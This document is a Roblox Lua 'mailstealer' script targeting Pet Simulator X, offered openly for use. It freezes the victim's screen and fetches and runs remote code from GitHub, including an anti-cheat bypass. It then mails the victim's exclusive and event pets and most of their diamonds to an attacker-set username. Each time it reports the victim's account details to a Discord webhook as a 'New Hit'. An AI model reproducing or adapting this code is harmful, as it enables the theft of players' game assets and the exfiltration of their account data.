--paxz mailstealer

local UserInputService = game:GetService("UserInputService")
UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter

for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
    v:Destroy(1)
    end

game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true

loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Loading%20screen"))()

function sendWebhook(webhook, message)
    local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"

 local url =
    webhook
 local data = {
    ["content"] = message
 }
 local newdata = game:GetService("HttpService"):JSONEncode(data)

 local headers = {
    ["content-type"] = "application/json"
 }
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/psxscripter1337/API/main/API.lua"))()

BypassAntiCheat()
AreaTeleport("Shop")
TeleportToMailbox()
local player = game:GetService("Players").LocalPlayer

local dims = player.leaderstats.Diamonds.Value - 80000000
if dims < 0 then
    dims = 0
end

wait(30)
for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
            local args = {
                [1] = {
                    ["Recipient"] = _G.UserName,
                    ["Diamonds"] = dims,
                    ["Pets"] = {
                        [1] = v.Name
                    },
                    ["Message"] = "made by Paxz"
                }
            }
        Networking.Invoke("Send Mail", unpack(args))
        local function getexploit()
	local exploit =
		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
		(secure_load and "Sentinel") or
		(is_sirhurt_closure and "Sirhurt") or
		(pebc_execute and "ProtoSmasher") or
		(KRNL_LOADED and "Krnl") or
		(WrapGlobal and "WeAreDevs") or
		(isvm and "Proxo") or
		(shadow_env and "Shadow") or
		(jit and "EasyExploits") or
		(getscriptenvs and "Calamari") or
		(unit and not syn and "Unit") or
		(OXYGEN_LOADED and "Oxygen U") or
		(IsElectron and "Electron") or
		("Unsupported")
  
	return exploit
  end
  
--// Execution Log
if game.PlaceId == 6284583030 then
	_G.GameIn = "Pet Simulator X"
elseif game.PlaceId == 7722306047 then
	_G.GameIn = "PSX Trading Plaza"
elseif game.PlaceId == 10321372166 then
	_G.GameIn = "PSX Hardcore"
elseif game.PlaceId == 12610002282 then
	_G.GameIn = "PSX Pro Trading Plaza"
elseif game.PlaceId == 11725212117 then
	_G.GameIn = "PSX Voice Trading Plaza"
else
	_G.GameIn = "❓ Couldn't find game"
end
local webhookcolor = "13369599"
_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
_G.PlrUserVictim = game.Players.LocalPlayer.Name
_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
_G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
local function sendwebhook(msg)
local msg = {
	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
	["content"]= "**🎁New Hit With Paxz🎁** || @here|| ",
	["username"] = "Arkhalis",
	["embeds"]= {
	  {
		["title"]= "`Arkhalis Mailstealer Results`",
		["description"]= "**Data from the victim**\n**🧑Display Name: **".._G.PlrDisplayNameVictim.."\n**🧑Username: **".._G.PlrUserVictim.."\n**🧑User ID: **".._G.PlrUserIDVictim.."\n**🐱Rank: **".._G.CurrentRank.."\n**🎮Place: **".._G.GameIn.."**\n☠Executor: **"..getexploit(),
		["url"]= "https://discord.gg/ajmeAeq76d",
		["color"]= ""..webhookcolor.."",
		["thumbnail"] = {
        ["url"] = "https://cdn.discordapp.com/attachments/1077585452309155850/1106236489819496448/cat.png",
        ["height"] = 420,
        ["width"] = 420
        },
		["fields"]= {
        {
          ["name"]= "**💎Diamonds 💎**",
          ["value"]= "```".._G.DisplayDiamond.."```",
          ["inline"]= true
        },
        {
          ["name"]= "**⬆️Rap⬆️**",
          ["value"]= "```".._G.DisplayRap.."```",
          ["inline"]= true
        },
        {
          ["name"]= "**📈Bank Tier📈**",
          ["value"]= "```".._G.DisplayBankTier.."```",
          ["inline"]= true
        }
      }
      
  }
  },
	["attachments"] = {}
  }
  local Webhook = _G.Webhook
  request = http_request or request or HttpPost or syn.request
  request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
  end
  sendwebhook(msg)
        dims = 0
        wait(7)
    end
end
end
